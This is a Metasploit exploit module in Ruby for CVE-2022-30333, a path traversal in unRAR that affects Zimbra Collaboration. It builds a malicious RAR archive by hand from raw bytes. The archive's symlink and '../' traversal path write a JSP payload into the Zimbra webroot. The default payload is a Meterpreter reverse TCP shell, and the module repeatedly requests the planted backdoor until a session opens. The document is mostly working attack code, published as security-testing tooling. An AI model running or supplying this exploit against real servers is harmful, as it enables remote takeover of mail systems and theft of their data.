##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::FILEFORMAT
  include Msf::Exploit::EXE
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'UnRAR Path Traversal in Zimbra (CVE-2022-30333)',
        'Description' => %q{
          This module creates a RAR file that exploits CVE-2022-30333, which is a
          path-traversal vulnerability in unRAR that can extract an arbitrary file
          to an arbitrary location on a Linux system.

          The core issue is that when a symbolic link is unRAR'ed, Windows
          symbolic links are not properly validated on Linux systems and can
          therefore write a symbolic link that points anywhere on the filesystem.
          If a second file in the archive has the same name, it will be written
          to the symbolic link path.

          The Zimbra target creates a RAR file that can exploit the following
          versions of Zimbra Collaboration:

          * Zimbra Collaboration 9.0.0 Patch 24 (and earlier)
          * Zimbra Collaboration 8.8.15 Patch 31 (and earlier)
        },
        'Author' => [
          'Simon Scannell', # Discovery / initial disclosure (via Sonar)
          'Ron Bowes', # Analysis, PoC, and module
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2022-30333'],
          ['URL', 'https://blog.sonarsource.com/zimbra-pre-auth-rce-via-unrar-0day/'],
          ['URL', 'https://github.com/pmachapman/unrar/commit/22b52431a0581ab5d687747b65662f825ec03946'],
          ['URL', 'https://wiki.zimbra.com/wiki/Zimbra_Releases/9.0.0/P25'],
          ['URL', 'https://wiki.zimbra.com/wiki/Zimbra_Releases/8.8.15/P32'],
        ],
        'Platform' => 'linux',
        'Arch' => [ARCH_X86, ARCH_X64],
        'Payload' => {
          # The RAR file has 4096 bytes of room. The payload is hex-encoded, and
          # the template is ~1624 bytes long (with worst possible RNG).
          'Space' => (4096 / 2) - 1700
        },
        'Targets' => [
          [
            'Zimbra Collaboration Suite',
            {
              'Arch' => [ARCH_X86, ARCH_X64, ARCH_JAVA],
              'DefaultOptions' => {
                'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp',

                'TARGET_PATH' => '../../../../../../../../../../../../opt/zimbra/jetty_base/webapps/zimbra/public/',
                'TARGET_FILENAME' => nil,
                'TARGET_EXTENSION' => 'jsp',
                'DisablePayloadHandler' => false,
                'RPORT' => 443,
                'SSL' => true,
                'EncodeAsJsp' => true
              }
            },
          ],
          [
            'Generic RAR file',
            {
              'Arch' => [ARCH_X86, ARCH_X64, ARCH_JAVA],
              'DefaultOptions' => {
                'DisablePayloadHandler' => true,
                'TARGET_PATH' => nil,
                'TARGET_FILENAME' => nil,
                'TARGET_EXTENSION' => nil,
                'AllowNoCleanup' => true,
                'EncodeAsJsp' => false
              }
            }
          ],
        ],
        'DefaultTarget' => 0,
        'Privileged' => false,
        'DisclosureDate' => '2022-06-28',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )

    register_options(
      [
        OptString.new('FILENAME', [ false, 'The file name.', 'payload.rar']),

        # Separating the path, filename, and extension allows us to randomize the filename
        OptString.new('TARGET_PATH', [ true, 'The location the payload should extract to (can, and should, contain path traversal characters - "../../").', nil]),
        OptString.new('TARGET_FILENAME', [ false, 'The filename to write in the target directory (default: random).', nil]),
        OptString.new('TARGET_EXTENSION', [ false, 'The extension to add to the filename (default: no extension).', nil]),
        OptString.new('EncodeAsJsp', [ false, 'Encode the payload as a .jsp file?', false])
      ]
    )

    register_advanced_options(
      [
        # Took this from multi/handler
        OptInt.new('ListenerTimeout', [ false, 'The maximum number of seconds to wait for new sessions.', 0 ]),
        OptInt.new('CheckInterval', [ true, 'The number of seconds to wait while checking for the payload.', 5 ])
      ]
    )
  end

  # Generate an on-system filename using datastore options
  def generate_target_filename
    target_filename = File.join(datastore['TARGET_PATH'], datastore['TARGET_FILENAME'] || Rex::Text.rand_text_alpha_lower(4..10))

    return target_filename unless datastore['TARGET_EXTENSION']

    "#{target_filename}.#{datastore['TARGET_EXTENSION']}"
  end

  # Normalize the path traversal and figure out where it is relative to the web root
  def zimbra_get_public_path(target_filename)
    # Normalize the path
    normalized_path = Pathname.new(File.join('/opt/zimbra/data/amavisd/tmp', target_filename)).cleanpath

    # Figure out where it is, relative to the webroot
    webroot = Pathname.new('/opt/zimbra/jetty_base/webapps/zimbra/')
    relative_path = normalized_path.relative_path_from(webroot)

    # Hopefully, we found a path from the webroot to the payload!
    if relative_path.to_s.start_with?('../')
      print_warning('Could not determine the public web path, disabling payload triggering')
      return nil
    end

    return relative_path
  end

  def encode_as_rar(target_path, data)
    unless target_path.length < 0x68
      fail_with(Failure::BadConfig, 'The configured TARGET_PATH is too long (max length: 103 characters)')
    end

    unless data.length < 4096
      fail_with(Failure::BadConfig, "The payload is too long (max length: 4096 bytes, it was #{data.length})")
    end

    # Null terminate the path, pad with NUL bytes, and invert the slashes
    symlink_target = (target_path + "\0").gsub('/', '\\').ljust(0x68, "\0")
    symlink_name = rand_text_alpha(12)

    # NULL-Pad the data as well
    data = data.ljust(4096, "\0")

    # Build a RAR file from pieces, filling in the blanks with our payloads.
    # The RAR format is non-free (and complex), so this is the easiest way to
    # build a payload file
    "\x52\x61\x72\x21\x1a\x07\x01\x00\xf3\xe1\x82\xeb\x0b\x01\x05\x07\x00\x06\x01\x01\x80\x80\x80\x00\x9e\xe2\xc4\xf5\x94\x01\x02\x03\x78\x00\x04\x00\xa0\x08\x00\x00\x00\x00\x80\x00\x00\x0c" +
      symlink_name + # Symlink filename
      "\x0a\x03\x02\xae\xf0\x37\x1c\x91\x98\xd8\x01\x6c\x05\x02\x00\x68" +
      symlink_target +
      "\xf3\xa1\x93\x68\x28\x02\x03\x0b\x80\x20\x04\x80\x20\x20" +
      [Zlib.crc32(data)].pack('V') +
      "\x80\x00\x00\x0c" +
      symlink_name + # Data filename (same as symlink to overwrite it)
      "\x0a\x03\x02\x00\x36\xe3\x00\x91\x98\xd8\x01" +
      data +
      "\x1d\x77\x56\x51\x03\x05\x04\x00"
  end

  def exploit
    payload = generate_payload_exe

    if datastore['EncodeAsJsp']
      print_status('Encoding the payload as a .jsp file')
      payload = Msf::Util::EXE.to_jsp(payload)
    end

    # Create a file
    target_filename = generate_target_filename
    print_status("Target filename: #{target_filename}")
    file_create(encode_as_rar(target_filename, payload))

    # If it's Zimbra, try to trigger the payload
    if target.name == 'Zimbra Collaboration Suite'
      print_good('File created! Email the file above to any user on the target Zimbra server')

      # Get the public path for triggering the vulnerability, terminate if we
      # can't figure it out
      public_filename = zimbra_get_public_path(target_filename)
      return if public_filename.nil?

      register_file_for_cleanup(target_filename)

      # This loop is mostly from `multi/handler`
      stime = Time.now.to_f
      timeout = datastore['ListenerTimeout'].to_i
      loop do
        break if session_created?
        break if timeout > 0 && (stime + timeout < Time.now.to_f)

        print_status("Trying to trigger the backdoor @ #{public_filename}...")

        res = send_request_cgi(
          'method' => 'GET',
          'uri' => normalize_uri(public_filename)
        )

        unless res
          fail_with(Failure::Unknown, 'Could not connect to the server to trigger the payload')
        end

        Rex::ThreadSafe.sleep(datastore['CheckInterval'].to_i)
      end
    end
  end
end
